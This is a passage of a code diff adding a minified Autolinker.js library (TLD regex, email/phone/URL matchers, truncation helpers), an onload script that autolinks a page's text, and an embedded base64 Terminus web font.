\u0644\u062c\u0632\u0627\u0626\u0631|\u0627\u0644\u0639\u0644\u064a\u0627\u0646|\u067e\u0627\u06a9\u0633\u062a\u0627\u0646|\u0643\u0627\u062b\u0648\u0644\u064a\u0643|\u0645\u0648\u0628\u0627\u064a\u0644\u064a|\u0b87\u0ba8\u0bcd\u0ba4\u0bbf\u0baf\u0bbe|abarth|abbott|abbvie|active|africa|agency|airbus|airtel|alipay|alsace|alstom|anquan|aramco|author|bayern|beauty|berlin|bharti|blanco|bostik|boston|broker|camera|career|caseih|casino|center|chanel|chrome|church|circle|claims|clinic|coffee|comsec|condos|coupon|credit|cruise|dating|datsun|dealer|degree|dental|design|direct|doctor|dunlop|dupont|durban|emerck|energy|estate|events|expert|family|flickr|futbol|gallup|garden|george|giving|global|google|gratis|health|hermes|hiphop|hockey|hughes|imamat|insure|intuit|jaguar|joburg|juegos|kaufen|kinder|kindle|kosher|lancia|latino|lawyer|lefrak|living|locker|london|luxury|madrid|maison|makeup|market|mattel|mobile|mobily|monash|mormon|moscow|museum|mutual|nagoya|natura|nissan|nissay|norton|nowruz|office|olayan|online|oracle|orange|otsuka|pfizer|photos|physio|piaget|pictet|quebec|racing|realty|reisen|repair|report|review|rocher|rogers|ryukyu|safety|sakura|sanofi|school|schule|secure|select|shouji|soccer|social|stream|studio|supply|suzuki|swatch|sydney|taipei|taobao|target|tattoo|tennis|tienda|tjmaxx|tkmaxx|toyota|travel|unicom|viajes|viking|villas|virgin|vision|voting|voyage|vuelos|walter|warman|webcam|xihuan|xperia|yachts|yandex|zappos|\u043c\u043e\u0441\u043a\u0432\u0430|\u043e\u043d\u043b\u0430\u0439\u043d|\u0627\u0628\u0648\u0638\u0628\u064a|\u0627\u0631\u0627\u0645\u0643\u0648|\u0627\u0644\u0627\u0631\u062f\u0646|\u0627\u0644\u0645\u063a\u0631\u0628|\u0627\u0645\u0627\u0631\u0627\u062a|\u0641\u0644\u0633\u0637\u064a\u0646|\u0645\u0644\u064a\u0633\u064a\u0627|\u0b87\u0bb2\u0b99\u0bcd\u0b95\u0bc8|\u30d5\u30a1\u30c3\u30b7\u30e7\u30f3|actor|adult|aetna|amfam|amica|apple|archi|audio|autos|azure|baidu|beats|bible|bingo|black|boats|boots|bosch|build|canon|cards|chase|cheap|chloe|cisco|citic|click|cloud|coach|codes|crown|cymru|dabur|dance|deals|delta|dodge|drive|dubai|earth|edeka|email|epost|epson|faith|fedex|final|forex|forum|gallo|games|gifts|gives|glade|glass|globo|gmail|green|gripe|group|gucci|guide|homes|honda|horse|house|hyatt|ikano|intel|irish|iveco|jetzt|koeln|kyoto|lamer|lease|legal|lexus|lilly|linde|lipsy|lixil|loans|locus|lotte|lotto|lupin|macys|mango|media|miami|money|mopar|movie|nadex|nexus|nikon|ninja|nokia|nowtv|omega|osaka|paris|parts|party|phone|photo|pizza|place|poker|praxi|press|prime|promo|quest|radio|rehab|reise|ricoh|rocks|rodeo|salon|sener|seven|sharp|shell|shoes|skype|sling|smart|smile|solar|space|stada|store|study|style|sucks|swiss|tatar|tires|tirol|tmall|today|tokyo|tools|toray|total|tours|trade|trust|tunes|tushu|ubank|vegas|video|vista|vodka|volvo|wales|watch|weber|weibo|works|world|xerox|yahoo|zippo|\u0627\u06cc\u0631\u0627\u0646|\u0628\u0627\u0632\u0627\u0631|\u0628\u06be\u0627\u0631\u062a|\u0633\u0648\u062f\u0627\u0646|\u0633\u0648\u0631\u064a\u0629|\u0647\u0645\u0631\u0627\u0647|\u0938\u0902\u0917\u0920\u0928|\u09ac\u09be\u0982\u09b2\u09be|\u0c2d\u0c3e\u0c30\u0c24\u0c4d|\u5609\u91cc\u5927\u9152\u5e97|aarp|able|adac|aero|aigo|akdn|ally|amex|army|arpa|arte|asda|asia|audi|auto|baby|band|bank|bbva|beer|best|bike|bing|blog|blue|bofa|bond|book|buzz|cafe|call|camp|care|cars|casa|case|cash|cbre|cern|chat|citi|city|club|cool|coop|cyou|data|date|dclk|deal|dell|desi|diet|dish|docs|doha|duck|duns|dvag|erni|fage|fail|fans|farm|fast|fiat|fido|film|fire|fish|flir|food|ford|free|fund|game|gbiz|gent|ggee|gift|gmbh|gold|golf|goog|guge|guru|hair|haus|hdfc|help|here|hgtv|host|hsbc|icbc|ieee|imdb|immo|info|itau|java|jeep|jobs|jprs|kddi|kiwi|kpmg|kred|land|lego|lgbt|lidl|life|like|limo|link|live|loan|loft|love|ltda|luxe|maif|meet|meme|menu|mini|mint|mobi|moda|moto|mtpc|name|navy|news|next|nico|nike|ollo|open|page|pars|pccw|pics|ping|pink|play|plus|pohl|porn|post|prod|prof|qpon|raid|read|reit|rent|rest|rich|rmit|room|rsvp|ruhr|safe|sale|sapo|sarl|save|saxo|scor|scot|seat|seek|sexy|shaw|shia|shop|show|silk|sina|site|skin|sncf|sohu|song|sony|spot|star|surf|talk|taxi|team|tech|teva|tiaa|tips|town|toys|tube|vana|visa|viva|vivo|vote|voto|wang|weir|wien|wiki|wine|work|xbox|yoga|zara|zero|zone|\u0434\u0435\u0442\u0438|\u0441\u0430\u0439\u0442|\u0628\u064a\u062a\u0643|\u062a\u0648\u0646\u0633|\u0634\u0628\u0643\u0629|\u0639\u0631\u0627\u0642|\u0639\u0645\u0627\u0646|\u0645\u0648\u0642\u0639|\u092d\u093e\u0930\u0924|\u09ad\u09be\u09b0\u09a4|\u0a2d\u0a3e\u0a30\u0a24|\u0aad\u0abe\u0ab0\u0aa4|\u0dbd\u0d82\u0d9a\u0dcf|\u30b0\u30fc\u30b0\u30eb|\u30af\u30e9\u30a6\u30c9|\u30dd\u30a4\u30f3\u30c8|\u5927\u4f17\u6c7d\u8f66|\u7ec4\u7ec7\u673a\u6784|\u96fb\u8a0a\u76c8\u79d1|\u9999\u683c\u91cc\u62c9|aaa|abb|abc|aco|ads|aeg|afl|aig|anz|aol|app|art|aws|axa|bar|bbc|bbt|bcg|bcn|bet|bid|bio|biz|bms|bmw|bnl|bom|boo|bot|box|buy|bzh|cab|cal|cam|car|cat|cba|cbn|cbs|ceb|ceo|cfa|cfd|com|crs|csc|dad|day|dds|dev|dhl|diy|dnp|dog|dot|dtv|dvr|eat|eco|edu|esq|eus|fan|fit|fly|foo|fox|frl|ftr|fun|fyi|gal|gap|gdn|gea|gle|gmo|gmx|goo|gop|got|gov|hbo|hiv|hkt|hot|how|htc|ibm|ice|icu|ifm|ing|ink|int|ist|itv|iwc|jcb|jcp|jio|jlc|jll|jmp|jnj|jot|joy|kfh|kia|kim|kpn|krd|lat|law|lds|lol|lpl|ltd|man|mba|mcd|med|men|meo|mil|mit|mlb|mls|mma|moe|moi|mom|mov|msd|mtn|mtr|nab|nba|nec|net|new|nfl|ngo|nhk|now|nra|nrw|ntt|nyc|obi|off|one|ong|onl|ooo|org|ott|ovh|pay|pet|pid|pin|pnc|pro|pru|pub|pwc|qvc|red|ren|ril|rio|rip|run|rwe|sap|sas|sbi|sbs|sca|scb|ses|sew|sex|sfr|ski|sky|soy|srl|srt|stc|tab|tax|tci|tdk|tel|thd|tjx|top|trv|tui|tvs|ubs|uno|uol|ups|vet|vig|vin|vip|wed|win|wme|wow|wtc|wtf|xin|xxx|xyz|you|yun|zip|\u0431\u0435\u043b|\u043a\u043e\u043c|\u049b\u0430\u0437|\u043c\u043a\u0434|\u043c\u043e\u043d|\u043e\u0440\u0433|\u0440\u0443\u0441|\u0441\u0440\u0431|\u0443\u043a\u0440|\u0570\u0561\u0575|\u05e7\u05d5\u05dd|\u0642\u0637\u0631|\u0643\u0648\u0645|\u0645\u0635\u0631|\u0915\u0949\u092e|\u0928\u0947\u091f|\u0e04\u0e2d\u0e21|\u0e44\u0e17\u0e22|\u30b9\u30c8\u30a2|\u30bb\u30fc\u30eb|\u307f\u3093\u306a|\u4e2d\u6587\u7f51|\u5929\u4e3b\u6559|\u6211\u7231\u4f60|\u65b0\u52a0\u5761|\u6de1\u9a6c\u9521|\u8bfa\u57fa\u4e9a|\u98de\u5229\u6d66|ac|ad|ae|af|ag|ai|al|am|ao|aq|ar|as|at|au|aw|ax|az|ba|bb|bd|be|bf|bg|bh|bi|bj|bm|bn|bo|br|bs|bt|bv|bw|by|bz|ca|cc|cd|cf|cg|ch|ci|ck|cl|cm|cn|co|cr|cu|cv|cw|cx|cy|cz|de|dj|dk|dm|do|dz|ec|ee|eg|er|es|et|eu|fi|fj|fk|fm|fo|fr|ga|gb|gd|ge|gf|gg|gh|gi|gl|gm|gn|gp|gq|gr|gs|gt|gu|gw|gy|hk|hm|hn|hr|ht|hu|id|ie|il|im|in|io|iq|ir|is|it|je|jm|jo|jp|ke|kg|kh|ki|km|kn|kp|kr|kw|ky|kz|la|lb|lc|li|lk|lr|ls|lt|lu|lv|ly|ma|mc|md|me|mg|mh|mk|ml|mm|mn|mo|mp|mq|mr|ms|mt|mu|mv|mw|mx|my|mz|na|nc|ne|nf|ng|ni|nl|no|np|nr|nu|nz|om|pa|pe|pf|pg|ph|pk|pl|pm|pn|pr|ps|pt|pw|py|qa|re|ro|rs|ru|rw|sa|sb|sc|sd|se|sg|sh|si|sj|sk|sl|sm|sn|so|sr|st|su|sv|sx|sy|sz|tc|td|tf|tg|th|tj|tk|tl|tm|tn|to|tr|tt|tv|tw|tz|ua|ug|uk|us|uy|uz|va|vc|ve|vg|vi|vn|vu|wf|ws|ye|yt|za|zm|zw|\u03b5\u03bb|\u0431\u0433|\u0435\u044e|\u0440\u0444|\u10d2\u10d4|\ub2f7\ub137|\ub2f7\ucef4|\uc0bc\uc131|\ud55c\uad6d|\u30b3\u30e0|\u4e16\u754c|\u4e2d\u4fe1|\u4e2d\u56fd|\u4e2d\u570b|\u4f01\u4e1a|\u4f5b\u5c71|\u4fe1\u606f|\u5065\u5eb7|\u516b\u5366|\u516c\u53f8|\u516c\u76ca|\u53f0\u6e7e|\u53f0\u7063|\u5546\u57ce|\u5546\u5e97|\u5546\u6807|\u5609\u91cc|\u5728\u7ebf|\u5927\u62ff|\u5a31\u4e50|\u5bb6\u96fb|\u5de5\u884c|\u5e7f\u4e1c|\u5fae\u535a|\u6148\u5584|\u624b\u673a|\u624b\u8868|\u653f\u52a1|\u653f\u5e9c|\u65b0\u95fb|\u65f6\u5c1a|\u66f8\u7c4d|\u673a\u6784|\u6e38\u620f|\u6fb3\u9580|\u70b9\u770b|\u73e0\u5b9d|\u79fb\u52a8|\u7f51\u5740|\u7f51\u5e97|\u7f51\u7ad9|\u7f51\u7edc|\u8054\u901a|\u8c37\u6b4c|\u8d2d\u7269|\u901a\u8ca9|\u96c6\u56e2|\u98df\u54c1|\u9910\u5385|\u9999\u6e2f)/;
+  b.matcher.Matcher = b.Util.extend(Object, {constructor:function(a) {
+    if (!a.tagBuilder) {
+      throw Error("`tagBuilder` cfg required");
+    }
+    this.tagBuilder = a.tagBuilder;
+  }, parseMatches:b.Util.abstractMethod});
+  b.matcher.Email = b.Util.extend(b.matcher.Matcher, {matcherRegex:function() {
+    var a = b.RegexLib.alphaNumericCharsStr + "!#$%&'*+\\-\\/=?^_`{|}~";
+    return new RegExp([(new RegExp("(?:[" + a + "](?:[" + a + ']|\\.(?!\\.|@))*|\\"[' + (a + '\\s"(),:;<>@\\[\\]') + '.]+\\")@')).source, b.RegexLib.domainNameRegex.source, "\\.", b.tldRegex.source].join(""), "gi");
+  }(), parseMatches:function(a) {
+    for (var c = this.matcherRegex, d = this.tagBuilder, f = [], e; null !== (e = c.exec(a));) {
+      var l = e[0];
+      f.push(new b.match.Email({tagBuilder:d, matchedText:l, offset:e.index, email:l}));
+    }
+    return f;
+  }});
+  b.matcher.Hashtag = b.Util.extend(b.matcher.Matcher, {matcherRegex:new RegExp("#[_" + b.RegexLib.alphaNumericCharsStr + "]{1,139}", "g"), nonWordCharRegex:new RegExp("[^" + b.RegexLib.alphaNumericCharsStr + "]"), constructor:function(a) {
+    b.matcher.Matcher.prototype.constructor.call(this, a);
+    this.serviceName = a.serviceName;
+  }, parseMatches:function(a) {
+    for (var c = this.matcherRegex, d = this.nonWordCharRegex, f = this.serviceName, e = this.tagBuilder, l = [], k; null !== (k = c.exec(a));) {
+      var h = k.index, g = a.charAt(h - 1);
+      if (0 === h || d.test(g)) {
+        g = k[0], k = k[0].slice(1), l.push(new b.match.Hashtag({tagBuilder:e, matchedText:g, offset:h, serviceName:f, hashtag:k}));
+      }
+    }
+    return l;
+  }});
+  b.matcher.Phone = b.Util.extend(b.matcher.Matcher, {matcherRegex:/(?:(\+)?\d{1,3}[-\040.]?)?\(?\d{3}\)?[-\040.]?\d{3}[-\040.]?\d{4}([,;]*[0-9]+#?)*/g, parseMatches:function(a) {
+    for (var c = this.matcherRegex, d = this.tagBuilder, f = [], e; null !== (e = c.exec(a));) {
+      var l = e[0], k = l.replace(/[^0-9,;#]/g, ""), h = !!e[1];
+      this.testMatch(e[2]) && this.testMatch(l) && f.push(new b.match.Phone({tagBuilder:d, matchedText:l, offset:e.index, number:k, plusSign:h}));
+    }
+    return f;
+  }, testMatch:function(a) {
+    return /\D/.test(a);
+  }});
+  b.matcher.Mention = b.Util.extend(b.matcher.Matcher, {matcherRegexes:{twitter:new RegExp("@[_" + b.RegexLib.alphaNumericCharsStr + "]{1,20}", "g"), instagram:new RegExp("@[_." + b.RegexLib.alphaNumericCharsStr + "]{1,50}", "g")}, nonWordCharRegex:new RegExp("[^" + b.RegexLib.alphaNumericCharsStr + "]"), constructor:function(a) {
+    b.matcher.Matcher.prototype.constructor.call(this, a);
+    this.serviceName = a.serviceName;
+  }, parseMatches:function(a) {
+    var c = this.matcherRegexes[this.serviceName], d = this.nonWordCharRegex, f = this.serviceName, e = this.tagBuilder, l = [], k;
+    if (!c) {
+      return l;
+    }
+    for (; null !== (k = c.exec(a));) {
+      var h = k.index, g = a.charAt(h - 1);
+      if (0 === h || d.test(g)) {
+        k = k[0].replace(/\.+$/g, ""), g = k.slice(1), l.push(new b.match.Mention({tagBuilder:e, matchedText:k, offset:h, serviceName:f, mention:g}));
+      }
+    }
+    return l;
+  }});
+  b.matcher.Url = b.Util.extend(b.matcher.Matcher, {matcherRegex:function() {
+    var a = b.RegexLib.domainNameRegex, c = b.RegexLib.alphaNumericCharsStr;
+    return new RegExp(["(?:(", /(?:[A-Za-z][-.+A-Za-z0-9]*:(?![A-Za-z][-.+A-Za-z0-9]*:\/\/)(?!\d+\/?)(?:\/\/)?)/.source, a.source, ")|((//)?", /(?:www\.)/.source, a.source, ")|((//)?", a.source + "\\.", b.tldRegex.source, "(?![-" + c + "])", "))(?::[0-9]+)?", "(?:" + (new RegExp("[/?#](?:[" + c + "\\-+&@#/%=~_()|'$*\\[\\]?!:,.;\u2713]*[" + c + "\\-+&@#/%=~_()|'$*\\[\\]\u2713])?")).source + ")?"].join(""), "gi");
+  }(), wordCharRegExp:new RegExp("[" + b.RegexLib.alphaNumericCharsStr + "]"), openParensRe:/\(/g, closeParensRe:/\)/g, constructor:function(a) {
+    b.matcher.Matcher.prototype.constructor.call(this, a);
+    if (null == a.stripPrefix) {
+      throw Error("`stripPrefix` cfg required");
+    }
+    if (null == a.stripTrailingSlash) {
+      throw Error("`stripTrailingSlash` cfg required");
+    }
+    this.stripPrefix = a.stripPrefix;
+    this.stripTrailingSlash = a.stripTrailingSlash;
+    this.decodePercentEncoding = a.decodePercentEncoding;
+  }, parseMatches:function(a) {
+    for (var c = this.matcherRegex, d = this.stripPrefix, f = this.stripTrailingSlash, e = this.decodePercentEncoding, l = this.tagBuilder, k = [], h; null !== (h = c.exec(a));) {
+      var g = h[0], m = h[1], q = h[2], n = h[5], p = h.index;
+      h = h[3] || n;
+      n = a.charAt(p - 1);
+      !b.matcher.UrlMatchValidator.isValid(g, m) || 0 < p && "@" === n || 0 < p && h && this.wordCharRegExp.test(n) || (/\?$/.test(g) && (g = g.substr(0, g.length - 1)), this.matchHasUnbalancedClosingParen(g) ? g = g.substr(0, g.length - 1) : (n = this.matchHasInvalidCharAfterTld(g, m), -1 < n && (g = g.substr(0, n))), k.push(new b.match.Url({tagBuilder:l, matchedText:g, offset:p, urlMatchType:m ? "scheme" : q ? "www" : "tld", url:g, protocolUrlMatch:!!m, protocolRelativeMatch:!!h, stripPrefix:d, 
+      stripTrailingSlash:f, decodePercentEncoding:e})));
+    }
+    return k;
+  }, matchHasUnbalancedClosingParen:function(a) {
+    if (")" === a.charAt(a.length - 1)) {
+      var b = a.match(this.openParensRe);
+      a = a.match(this.closeParensRe);
+      if ((b && b.length || 0) < (a && a.length || 0)) {
+        return !0;
+      }
+    }
+    return !1;
+  }, matchHasInvalidCharAfterTld:function(a, c) {
+    if (!a) {
+      return -1;
+    }
+    var d = 0;
+    c && (d = a.indexOf(":"), a = a.slice(d));
+    var f = b.RegexLib.alphaNumericCharsStr;
+    f = (new RegExp("^((.?//)?[-." + f + "]*[-" + f + "]\\.[-" + f + "]+)")).exec(a);
+    if (null === f) {
+      return -1;
+    }
+    d += f[1].length;
+    a = a.slice(f[1].length);
+    return /^[^-.A-Za-z0-9:\/?#]/.test(a) ? d : -1;
+  }});
+  b.matcher.UrlMatchValidator = {hasFullProtocolRegex:/^[A-Za-z][-.+A-Za-z0-9]*:\/\//, uriSchemeRegex:/^[A-Za-z][-.+A-Za-z0-9]*:/, hasWordCharAfterProtocolRegex:new RegExp(":[^\\s]*?[" + b.RegexLib.alphaCharsStr + "]"), ipRegex:/[0-9][0-9]?[0-9]?\.[0-9][0-9]?[0-9]?\.[0-9][0-9]?[0-9]?\.[0-9][0-9]?[0-9]?(:[0-9]*)?\/?$/, isValid:function(a, b) {
+    return b && !this.isValidUriScheme(b) || this.urlMatchDoesNotHaveProtocolOrDot(a, b) || this.urlMatchDoesNotHaveAtLeastOneWordChar(a, b) && !this.isValidIpAddress(a) || this.containsMultipleDots(a) ? !1 : !0;
+  }, isValidIpAddress:function(a) {
+    return null !== a.match(new RegExp(this.hasFullProtocolRegex.source + this.ipRegex.source));
+  }, containsMultipleDots:function(a) {
+    return -1 < a.indexOf("..");
+  }, isValidUriScheme:function(a) {
+    a = a.match(this.uriSchemeRegex)[0].toLowerCase();
+    return "javascript:" !== a && "vbscript:" !== a;
+  }, urlMatchDoesNotHaveProtocolOrDot:function(a, b) {
+    return !!a && (!b || !this.hasFullProtocolRegex.test(b)) && -1 === a.indexOf(".");
+  }, urlMatchDoesNotHaveAtLeastOneWordChar:function(a, b) {
+    return a && b ? !this.hasWordCharAfterProtocolRegex.test(a) : !1;
+  }};
+  b.truncate.TruncateEnd = function(a, c, d) {
+    return b.Util.ellipsis(a, c, d);
+  };
+  b.truncate.TruncateMiddle = function(a, b, d) {
+    if (a.length <= b) {
+      return a;
+    }
+    if (null == d) {
+      d = "&hellip;";
+      var c = 8;
+      var e = 3;
+    } else {
+      e = c = d.length;
+    }
+    b -= e;
+    e = "";
+    0 < b && (e = a.substr(-1 * Math.floor(b / 2)));
+    return (a.substr(0, Math.ceil(b / 2)) + d + e).substr(0, b + c);
+  };
+  b.truncate.TruncateSmart = function(a, b, d) {
+    if (null == d) {
+      d = "&hellip;";
+      var c = 3;
+      var e = 8;
+    } else {
+      e = c = d.length;
+    }
+    var l = function(a) {
+      var b = "";
+      a.scheme && a.host && (b += a.scheme + "://");
+      a.host && (b += a.host);
+      a.path && (b += "/" + a.path);
+      a.query && (b += "?" + a.query);
+      a.fragment && (b += "#" + a.fragment);
+      return b;
+    }, k = function(a, b) {
+      var c = b / 2, e = Math.ceil(c);
+      c = -1 * Math.floor(c);
+      var f = "";
+      0 > c && (f = a.substr(c));
+      return a.substr(0, e) + d + f;
+    };
+    if (a.length <= b) {
+      return a;
+    }
+    var h = b - c, g = function(a) {
+      var b = {}, c = a.match(/^([a-z]+):\/\//i);
+      c && (b.scheme = c[1], a = a.substr(c[0].length));
+      if (c = a.match(/^(.*?)(?=(\?|#|\/|$))/i)) {
+        b.host = c[1], a = a.substr(c[0].length);
+      }
+      if (c = a.match(/^\/(.*?)(?=(\?|#|$))/i)) {
+        b.path = c[1], a = a.substr(c[0].length);
+      }
+      if (c = a.match(/^\?(.*?)(?=(#|$))/i)) {
+        b.query = c[1], a = a.substr(c[0].length);
+      }
+      if (c = a.match(/^#(.*?)$/i)) {
+        b.fragment = c[1];
+      }
+      return b;
+    }(a);
+    if (g.query) {
+      var m = g.query.match(/^(.*?)(?=(\?|#))(.*?)$/i);
+      m && (g.query = g.query.substr(0, m[1].length), a = l(g));
+    }
+    if (a.length <= b) {
+      return a;
+    }
+    g.host && (g.host = g.host.replace(/^www\./, ""), a = l(g));
+    if (a.length <= b) {
+      return a;
+    }
+    a = "";
+    g.host && (a += g.host);
+    if (a.length >= h) {
+      return g.host.length == b ? (g.host.substr(0, b - c) + d).substr(0, h + e) : k(a, h).substr(0, h + e);
+    }
+    c = "";
+    g.path && (c += "/" + g.path);
+    g.query && (c += "?" + g.query);
+    if (c) {
+      if ((a + c).length >= h) {
+        return (a + c).length == b ? (a + c).substr(0, b) : (a + k(c, h - a.length)).substr(0, h + e);
+      }
+      a += c;
+    }
+    if (g.fragment) {
+      c = "#" + g.fragment;
+      if ((a + c).length >= h) {
+        return (a + c).length == b ? (a + c).substr(0, b) : (a + k(c, h - a.length)).substr(0, h + e);
+      }
+      a += c;
+    }
+    if (g.scheme && g.host && (k = g.scheme + "://", (a + k).length < h)) {
+      return (k + a).substr(0, b);
+    }
+    if (a.length <= b) {
+      return a;
+    }
+    b = "";
+    0 < h && (b = a.substr(-1 * Math.floor(h / 2)));
+    return (a.substr(0, Math.ceil(h / 2)) + d + b).substr(0, h + e);
+  };
+  return b;
+});
+</script>
+<script>
+window.onload = function () {
+	var div = document.getElementById('x');
+	text = div.innerHTML;
+
+	text = text.replace(/ /gi, "&nbsp;")
+	<!--text = text.replace(/</gi, "&lt;")-->
+	<!--text = text.replace(/>/gi, "&gt;")-->
+
+	lines = text.split("\n");
+	text = ""; 
+	for (var i = 0; i < lines.length; i++)
+	{
+		var line = lines[i];
+		text += line + "<br>";
+	}
+
+	text = text.replace(/\n/gi, "<br>\n")
+
+
+	autolinker = new Autolinker( {
+		urls : {
+			schemeMatches : true,
+			wwwMatches    : true,
+			tldMatches    : true
+		},
+		email       : true,
+		phone       : true,
+		mention     : false,
+		hashtag     : false,
+
+		stripPrefix : true,
+		stripTrailingSlash : true,
+		newWindow   : false,
+
+		truncate : {
+			length   : 0,
+			location : 'end'
+		},
+
+		className : ''
+	} );
+
+	var linked = autolinker.link(text);
+
+	div.innerHTML = linked;
+};
+
+</script>
+<style>
+@font-face {
+    font-family: Terminus;
+    src: url("data:font/woff2;base64,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